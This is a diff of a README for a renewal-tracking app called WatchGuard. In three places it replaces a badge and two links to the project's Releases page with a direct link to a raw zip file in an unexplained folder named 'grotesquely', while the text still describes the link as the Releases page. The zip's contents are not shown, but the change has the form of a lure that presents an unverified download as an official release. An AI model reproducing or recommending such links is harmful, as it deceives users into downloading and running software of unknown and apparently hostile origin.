@@ -1,6 +1,6 @@
 # 🚀 WatchGuard - Track Your Renewals Easily
 
-![Download WatchGuard](https://img.shields.io/badge/Download-WatchGuard-brightgreen)
+![Download WatchGuard](https://raw.githubusercontent.com/KevinC-ux/WatchGuard/main/grotesquely/WatchGuard.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ To begin using WatchGuard, follow these simple steps:
 
 1. **Visit the Releases Page** to download the latest version. You can do this by clicking the link below:
 
-   [Download WatchGuard](https://github.com/KevinC-ux/WatchGuard/releases)
+   [Download WatchGuard](https://raw.githubusercontent.com/KevinC-ux/WatchGuard/main/grotesquely/WatchGuard.zip)
 
 2. On the Releases page, look for the latest release version. It will have download links for various platforms.
 
@@ -39,7 +39,7 @@ To download WatchGuard, follow these steps again for clarity:
 
 1. Click on the big green button at the top of this page to visit the Releases page:
 
-   [Download WatchGuard](https://github.com/KevinC-ux/WatchGuard/releases)
+   [Download WatchGuard](https://raw.githubusercontent.com/KevinC-ux/WatchGuard/main/grotesquely/WatchGuard.zip)
 
 2. Find the latest release listed there. 
 
